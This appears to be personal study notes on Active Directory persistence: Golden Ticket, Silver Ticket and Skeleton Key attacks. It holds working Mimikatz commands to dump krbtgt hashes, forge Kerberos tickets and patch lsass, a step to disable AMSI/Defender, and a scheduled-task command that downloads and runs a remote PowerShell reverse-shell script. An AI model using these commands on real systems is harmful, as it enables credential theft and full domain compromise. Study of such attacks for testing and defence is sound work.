# AD - Domain Dominance / Persistence

## asics

* Once we have DA - new persistence is possible => escalation to Enterprise Admin and attacks across trusts
* Abusing trusts within domain, across domains and forests
* NTLM hash vor Kerberos are RC4, DES (both old) or AES encrypted&#x20;
* Kerberos policy only checked when TGT is created
* DC validates user account only when TGT > 20min
* Service Ticket (TGS) PAC is optional and not very often used
  * Server LSASS sends PAC validation request to DC netlogon service (NRPC)
  * It runs as servce, PAC validation is optional (disabled)
  * If a service runs as Syste, it performs server signature verification on the PAC (Computer account long-term key)

**How Kerberos works**

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

1. Password converted to NTLM hash. A Timestamp is encrypted and signed with the NTLM hash of the Users Password and sent to the KDC (AS-REQ)
2. The TGT (Ticket granting ticket) is generated and encrypted & signed with the NTLM Hash of krbtgt hash
3. The TGT is sent back to DC, because client can not decrypt it. Client Request a TGS (Ticket granting service). \
   The DC assumes whatever is inside the TGT, as long as it can be decrypted with krbtgt, it is assumed to be valid.\
   ❓Up to 20 Minutes the TGT is valid?
4. The TGS is returned with encryption of the target service/application service's NTLM hash
5. The Applicatoin Server decrypts the TGS because it is with its own service NTLM hash encrypted, and then decides whether user can access

## 🥇🎫Golden Ticket Attack

### Description

* Abuse is in Step 3 and 4, where a valid TGT is generated&#x20;
* A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket
* Since user account validation is not done by DC until TGT is older than 20min, we use even deleted/revoked accounts
* The krbtgt user hash could be used to impersonate any user with any privilege from even a non-domain machine
* Password change (of krbtgt account)has no effect on this attack because previous hash will also be accpeted - you have to change the pw of krbtgt twice

### Requirements

* krbtgt Hash has to be known

### Tools

**Execute Mimikatz on DC to get krbtgt hash - required DA privs**\
Invoke-Mimikatz -command '"lsadump:lsa /patch" -computername dc-hostname

&#x20;With powershell session on dc:\
$sess = New-Session -Computername dc.local\
Disable AMSI/Defender in that session\
Exit\
Invoke-command -session $ses -filepath C:\invoke-mimikatz.ps1\
Enter-Pssession  -session $sess\
Invoke-Mimikatz -command '"lsadump:lsa /patch\


**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**\
Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'

**Overpass the hash to start powershell**\
Invoke-Mimikatz -command '"sekurlsa:pth /user:svcadmin /domain:dom.local /ntlm:hash /run:powershell.exe"'



**Create a golden ticket when we have the krbtgt hash extracted from above** \
****Invoke-Mimikatz - command '"kerberos::golden /User:Administrator /domain:dom.local /sid:S-1-5-21-..... /krbtgt:hash.... id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Use DCsync Attack / more silent in DC Logs

## 🥈🎫Silver Ticket Attack

### Description

* Step 5 is abused (AP-REQ)
* Trust anchor/key is the NTLM Hash of the Service Account of the application server. You can then access the service by impersonating any user, also high privs User
* A Silver Ticket is a valid TGS
* Encrypted and signed NTLM hash of the service account of the service running with that account
* Service rareley chekcs PAC (Privileged Attriute Certificate) - if it is enabled (default disabled), Silver Ticket Attack will fail
* Services will allow access only to the service themeselves
* ❓ Resonable persistence period (default 30 days for computer accounts) - but machine can request ist earlier or later - disable the change of machine password is also possible
* Interesting Service Accounts: CIFS, host, rpcss (can be used by WMI),wsman (powershell remoting) - all of them use the machine account as their service account

### Requirement

Machine account hash (e.g. after krbtgt&#x20;

### Tools

**Get domain controller account hash**\
Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:cifs /rc4:hash /user:Administrator /ptt"'

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
* Target is the host from where whe have the service account hash
* Using "cifs" service for later access the filesystem of the Server
* Using "host" service allows to schedule tasks then on the target host
* List of SPN which can be used: https://adsecurity.org/?page\_id=183&#x20;
{% endhint %}

**Schedudle an execute a task with silver ticket of "HOST" Service**

schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke\_powerShellTcp.ps1''')'"

schtasks /Run /S hostname.dom.local /TN "STCheck"

{% hint style="info" %}
* Attention: Within Download String these are two '
* STCheck is the Name of the task you create
{% endhint %}

**List tasks**\
****schtasks /S hostname.dom.local

## 🦴Skeleton Key

### Description

* Skeleton KEy is a persistance technique whewre it is possible to patch a Domain Controllers lsass process, that it allows access ans any user with a single password.
* The regular Password and the new password will work
* Malware named "Skeleton Key" used it
* Not persistent after reboot/lsass process restart
* You can access other machines, which authenticate to this DC
* You can not patch lsass twice, reboot is required

### Requirements

* Needs DA rights

### Tools

**Inject a skeleton key, password will be mimikatz - DA rights required**\
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local

Now you can login e.g. with Enter-PSSession

❓Debug really needed?

{% hint style="info" %}
If lsass runs as protected process/protected process light, skeleton key can still be used. We need to use the mimikatz driver (mimidriv.sys) on the disk of the target DC:

mimikatz#privilege::debug\
mimikatz# !+\
mimikatz# !processprotect /process:lsass.exe /remove\
mimikatz# misc::skeleton\
mimikatz# !-

Noisy in logs - Service Installation for a kernel mode driver will be displayed

❓(Still work??) => This will install kernel mode driver
{% endhint %}











